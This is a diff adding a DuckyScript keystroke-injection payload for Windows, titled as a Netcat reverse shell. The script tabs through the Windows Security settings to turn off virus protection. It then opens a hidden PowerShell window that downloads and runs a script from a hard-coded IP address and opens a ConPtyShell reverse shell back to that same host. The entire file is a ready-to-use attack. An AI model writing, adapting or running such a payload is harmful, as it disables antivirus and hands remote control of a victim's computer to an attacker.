@@ -1,0 +1,42 @@
+REM === Payload Title: Establish Reverse Shell via Netcat ===
+REM Author: Shad Bin Mohd Rizal
+REM Created: 18-10-2025
+REM Purpose: Execute a reverse shell using Netcat
+REM Target: Windows environment 
+REM Notes:
+REM - This script temporarily disables Windows Defender through the GUI to ensure uninterrupted execution of PowerShell commands.                                                  
+REM - A public server is required to host the PowerShell script.                                                 
+REM - Refer to https://github.com/antonioCoco/ConPtyShell for the project's documentation for implementation details. 
+
+REM Disable Windows Defender AV
+GUI S
+DELAY 300
+STRING virus protection
+DELAY 400
+ENTER
+DELAY 2000
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+TAB
+DELAY 150
+ENTER
+DELAY 400
+SPACE
+DELAY 700
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 200
+ALT F4
+DELAY 200
+
+REM Launch Netcat to listener
+GUI R
+DELAY 400
+STRING powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest 'http://101.99.74.214:81/windows-nc-rs.ps1' -UseBasicParsing).Content; Invoke-ConPtyShell 101.99.74.214 87"
+DELAY 400
+ENTER
